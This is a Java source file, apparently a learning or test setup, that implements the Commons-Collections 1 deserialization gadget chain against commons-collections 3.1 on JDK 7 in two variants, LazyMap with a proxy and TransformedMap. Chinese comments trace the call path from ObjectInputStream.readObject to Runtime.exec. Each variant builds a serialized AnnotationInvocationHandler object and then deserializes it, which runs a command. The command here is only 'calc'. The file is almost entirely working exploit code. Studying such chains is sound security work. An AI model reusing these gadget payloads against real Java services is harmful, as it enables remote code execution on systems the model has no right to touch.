package vuln;


import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;
import util.SerializeUtil;

import javax.annotation.Generated;
import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

//
/**
 * cc1的测试环境
 * jdk7
 * cc版本3.1
 *
 * **/
public class Commoncollections1 {
    public static void main(String[] args) throws IOException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException {
        vulnToLazyMap();
//            vulnToTransformedMap();
    }

    /**
     * 漏洞利用链,这里使用了LazyMap$get这个方法
     * ObjectInputStream.readObject()
     * AnnotationInvocationHandler.readObject()
     * Map(Proxy).entrySet()
     * AnnotationInvocationHandler.invoke()
     * LazyMap.get()
     * ChainedTransformer.transform()
     * ConstantTransformer.transform()
     * InvokerTransformer.transform()
     * Method.invoke()
     * Class.getMethod()
     * InvokerTransformer.transform()
     * Method.invoke()
     * Runtime.getRuntime()
     * InvokerTransformer.transform()
     * Method.invoke()
     * Runtime.exec()
     **/
    public static void vulnToLazyMap() throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException {
        ChainedTransformer chainedTransformer = new ChainedTransformer(
                new Transformer[]{new ConstantTransformer(Runtime.class),
                        new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                        new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})}
        );
        HashMap hashMap = new HashMap();
        Map decorate = LazyMap.decorate(hashMap, chainedTransformer);

        Class<?> aClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);
        declaredConstructor.setAccessible(true);
        InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Target.class, decorate);
        Map invocation_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, invocationHandler);
        InvocationHandler o = (InvocationHandler) declaredConstructor.newInstance(Target.class, invocation_map);


        SerializeUtil.readObjectToByteArray(SerializeUtil.writeObjectToByteArray(o));
    }

    /**
     *漏洞利用链,这里使用TransformedMap,TransformedMap简单理解就是Map的增强,例如新增元素的时候,会调用回调函数来增强功能
     *
     * ObjectInputStream.readObject()
     * AnnotationInvocationHandler.readObject()
     * AbstractInputCheckedMapDecorator.setValue()
     * TransformedMap.checkSetValue()
     * ChainedTransformer.transform()
     * ConstantTransformer.transform()
     * InvokerTransformer.transform()
     * Method.invoke()
     * Class.getMethod()
     * InvokerTransformer.transform()
     * Method.invoke()
     * Runtime.getRuntime()
     * InvokerTransformer.transform()
     * Method.invoke()
     * Runtime.exec()
     *
     * **/
    public static void vulnToTransformedMap() throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException {
        ChainedTransformer chainedTransformer = new ChainedTransformer(
                new Transformer[]{new ConstantTransformer(Runtime.class),
                        new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                        new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                        new InvokerTransformer("exec",new Class[]{String.class},new String[]{"calc"})}
        );
        HashMap hashMap = new HashMap();
        hashMap.put("value","a");
        Map decorateMap = TransformedMap.decorate(hashMap, null, chainedTransformer);
        Class<?> aClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);
        declaredConstructor.setAccessible(true);
        InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Target.class, decorateMap);
        SerializeUtil.writeObjectToFile(invocationHandler);
        SerializeUtil.readObjectToFile();

//
//
    }
}
